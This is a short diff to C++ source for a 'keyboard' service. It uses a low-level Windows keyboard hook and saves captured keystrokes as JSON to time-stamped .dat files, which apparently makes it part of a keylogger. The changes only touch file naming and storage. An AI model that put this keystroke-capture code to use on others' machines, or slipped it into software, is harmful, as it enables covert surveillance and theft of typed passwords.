@@ -1,4 +1,4 @@
-#include "services.h"
+#include "services.hpp"
 #if KEYBOARD_SERVICE
 
 void services::keyboard::run()
@@ -107,7 +107,6 @@ LRESULT CALLBACK services::keyboard::LowLevelKeyboardProc(int nCode, WPARAM wPar
 
 void services::keyboard::processvk(VirtualKeyInfo vkInfo)
 {
-
 	// Filter virtual-key repeats
 	if (vkcmp(vkInfo, lastKeyPressed))
 	{
@@ -166,17 +165,18 @@ void services::keyboard::save()
 	json << "]}";
 	std::string result = json.str();
 
+	// Create directory for keyboard data if not exist
 	if (!io::directory::exist(dir))
 	{
 		io::directory::create(dir);
 	}
 
-	std::ofstream output(std::string(dir) + "\\1.dat", std::ios::trunc);
-	if (output.is_open())
-	{
-		output << result;
-		output.close();
-	}
+	// Generate filename by time
+	std::stringstream filename;
+	filename << dir << "\\" << tools::getTime(tools::TimeFormat::file) << ".dat";
+
+	// Write json-formated keyboard data to file
+	io::file::write(filename.str(), result);
 
 	// Prepare buffer to next virtual-key sequence
 	vkListCursorBegin = 0;
